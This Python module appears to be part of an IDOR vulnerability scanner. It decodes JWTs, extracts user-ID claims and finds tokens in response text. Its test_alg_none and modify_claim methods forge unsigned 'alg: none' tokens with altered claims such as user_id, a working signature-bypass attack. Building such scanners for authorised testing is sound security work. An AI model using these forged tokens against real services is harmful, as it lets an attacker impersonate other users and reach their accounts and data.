"""
JWT Token Analyzer for IDOR Scanner.

Analyzes JWT tokens to extract user IDs, test for vulnerabilities,
and attempt signature bypass attacks.
"""

import base64
import json
import logging
import re
from typing import Dict, Any, Optional, Tuple, List

logger = logging.getLogger(__name__)


class JWTAnalyzer:
    """Analyzes JWT tokens for vulnerabilities and user ID extraction."""
    
    # Common claim names that might contain user IDs
    USER_ID_CLAIMS = [
        'sub', 'user_id', 'uid', 'userId', 'user', 'id',
        'account_id', 'accountId', 'customer_id', 'customerId',
        'email', 'username', 'login'
    ]
    
    def __init__(self):
        self.decoded_tokens: Dict[str, Dict] = {}
    
    def decode_token(self, token: str) -> Optional[Dict[str, Any]]:
        """
        Decode a JWT token without verification.
        
        Args:
            token: JWT token string (with or without 'Bearer ' prefix)
            
        Returns:
            Dictionary with header, payload, and signature parts
        """
        # Remove Bearer prefix if present
        if token.lower().startswith('bearer '):
            token = token[7:]
        
        try:
            parts = token.split('.')
            if len(parts) != 3:
                logger.debug("Token does not have 3 parts, not a valid JWT")
                return None
            
            header = self._decode_base64(parts[0])
            payload = self._decode_base64(parts[1])
            
            result = {
                'header': header,
                'payload': payload,
                'signature': parts[2],
                'raw': token
            }
            
            self.decoded_tokens[token] = result
            return result
            
        except Exception as e:
            logger.error(f"Failed to decode JWT: {e}")
            return None
    
    def _decode_base64(self, data: str) -> Dict:
        """Decode base64url encoded JSON."""
        # Add padding if needed
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        
        # Replace URL-safe characters
        data = data.replace('-', '+').replace('_', '/')
        
        decoded = base64.b64decode(data)
        return json.loads(decoded)
    
    def extract_user_id(self, token: str) -> Optional[str]:
        """
        Extract user ID from JWT token.
        
        Args:
            token: JWT token string
            
        Returns:
            User ID if found, None otherwise
        """
        decoded = self.decode_token(token)
        if not decoded:
            return None
        
        payload = decoded.get('payload', {})
        
        # Try each known user ID claim
        for claim in self.USER_ID_CLAIMS:
            if claim in payload:
                return str(payload[claim])
        
        return None
    
    def test_alg_none(self, token: str) -> Tuple[str, bool]:
        """
        Test for 'alg: none' vulnerability.
        
        Creates a token with algorithm set to 'none' and empty signature.
        If server accepts this, it's vulnerable.
        
        Args:
            token: Original JWT token
            
        Returns:
            Tuple of (modified_token, is_testable)
        """
        decoded = self.decode_token(token)
        if not decoded:
            return token, False
        
        # Create new header with alg: none
        new_header = decoded['header'].copy()
        new_header['alg'] = 'none'
        
        # Encode header and payload
        header_b64 = self._encode_base64(new_header)
        payload_b64 = self._encode_base64(decoded['payload'])
        
        # Create token with empty signature
        none_token = f"{header_b64}.{payload_b64}."
        
        return none_token, True
    
    def _encode_base64(self, data: Dict) -> str:
        """Encode dictionary to base64url."""
        json_str = json.dumps(data, separators=(',', ':'))
        b64 = base64.b64encode(json_str.encode()).decode()
        # Make URL-safe
        return b64.replace('+', '-').replace('/', '_').rstrip('=')
    
    def modify_claim(self, token: str, claim: str, new_value: Any) -> Optional[str]:
        """
        Create a modified token with a different claim value.
        
        Useful for testing if changing user_id in token grants access.
        
        Args:
            token: Original JWT token
            claim: Claim name to modify
            new_value: New value for the claim
            
        Returns:
            Modified token (unsigned, for testing purposes)
        """
        decoded = self.decode_token(token)
        if not decoded:
            return None
        
        # Modify payload
        new_payload = decoded['payload'].copy()
        new_payload[claim] = new_value
        
        # Keep original header but with alg:none for testing
        new_header = decoded['header'].copy()
        new_header['alg'] = 'none'
        
        header_b64 = self._encode_base64(new_header)
        payload_b64 = self._encode_base64(new_payload)
        
        return f"{header_b64}.{payload_b64}."
    
    def get_all_claims(self, token: str) -> Dict[str, Any]:
        """Get all claims from a JWT token."""
        decoded = self.decode_token(token)
        if not decoded:
            return {}
        return decoded.get('payload', {})
    
    def find_tokens_in_response(self, response_text: str) -> List[str]:
        """
        Find JWT tokens in a response body.
        
        Args:
            response_text: Response body text
            
        Returns:
            List of JWT tokens found
        """
        # JWT pattern: header.payload.signature
        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        
        tokens = re.findall(jwt_pattern, response_text)
        return tokens
